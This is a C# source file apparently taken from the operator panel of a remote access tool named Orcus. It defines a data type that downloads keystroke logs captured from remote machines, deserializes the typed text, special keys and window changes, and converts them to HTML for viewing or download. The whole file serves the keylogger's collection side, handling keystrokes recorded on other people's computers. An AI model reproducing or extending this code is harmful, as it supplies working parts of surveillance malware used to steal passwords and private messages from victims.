using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.Plugins.DataManager;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Plugins;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Commands.Keylogger;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.ViewModels.DataManager.DataTypes
{
    public class FileManagerKeyLog : IDataManagerType
    {
        public bool CanDownload { get; } = true;

        public string GetFileExtension(DataEntry dataEntry)
        {
            return ".html";
        }

        public string TypeId { get; } = (string) Application.Current.Resources["Keylog"];
        public bool SupportsMultipleEntries { get; } = false;
        public bool IsDataViewable { get; } = true;
        public Guid DataTypeGuid { get; } = DataMode.KeyLog.Guid;

        public ImageSource GetIconForEntry(DataEntry dataEntry)
        {
            return new BitmapImage(new Uri("/Resources/Images/Keyboard.png", UriKind.Relative));
        }

        public void ChangeEntryData(DataEntry dataEntry)
        {
        }

        public void ModifyDownloadedFile(string fileName)
        {
            var items = new Serializer(new[]
            {
                typeof (List<KeyLogEntry>),
                typeof (NormalText),
                typeof (SpecialKey),
                typeof (StandardKey),
                typeof (WindowChanged)
            }).Deserialize<List<KeyLogEntry>>(File.ReadAllBytes(fileName));
            File.Delete(fileName);
            File.WriteAllText(fileName, KeyLogExtensions.GenerateHtmlText(items, false, false));
        }

        public async Task<DataViewer> GetDataViewer(DataEntry dataEntry, IDataConnection dataConnection)
        {
            var data = await dataConnection.DownloadEntry(dataEntry);
            return (DataViewer) WindowServiceInterface.Current.GetView(new Serializer(new[]
            {
                typeof (List<KeyLogEntry>),
                typeof (NormalText),
                typeof (SpecialKey),
                typeof (StandardKey),
                typeof (WindowChanged)
            }).Deserialize<List<KeyLogEntry>>(data));
        }

        public Task<DataViewer> GetDataViewer(List<DataEntry> dataEntries, IDataConnection dataConnection)
        {
            throw new NotImplementedException();
        }
    }
}